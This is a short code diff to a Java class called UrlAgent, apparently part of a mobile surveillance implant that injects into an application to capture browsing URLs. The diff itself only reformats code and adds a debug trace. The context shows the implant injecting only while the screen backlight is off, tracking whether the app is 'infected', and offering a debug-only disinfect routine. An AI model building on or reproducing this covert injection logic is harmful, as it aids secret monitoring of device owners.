@@ -87,7 +87,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             debug.error("actualStart: " + ex);
             //#endif
         }
-        
+
         if (!Backlight.isEnabled() && !appInjector.isInfected()) {
             //#ifdef DEBUG
             debug.info("injecting");
@@ -121,6 +121,12 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
 
             appInjector.callMenuInContext();
+        } else {
+            //#ifdef DEBUG
+            debug.trace("actualRun: infected=" + appInjector.isInfected()
+                    + " backlight=" + Backlight.isEnabled() + " foreground="
+                    + isAppForeground);
+            //#endif
         }
     }
 
@@ -188,10 +194,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     public static UrlAgent getInstance() {
         return (UrlAgent) AgentManager.getInstance().getItem(Agent.AGENT_URL);
     }
-    
+
     //#ifdef DEBUG
-    public void disinfect(){
-        if(appInjector!=null){
+    public void disinfect() {
+        if (appInjector != null) {
             appInjector.disinfect();
         }
     }
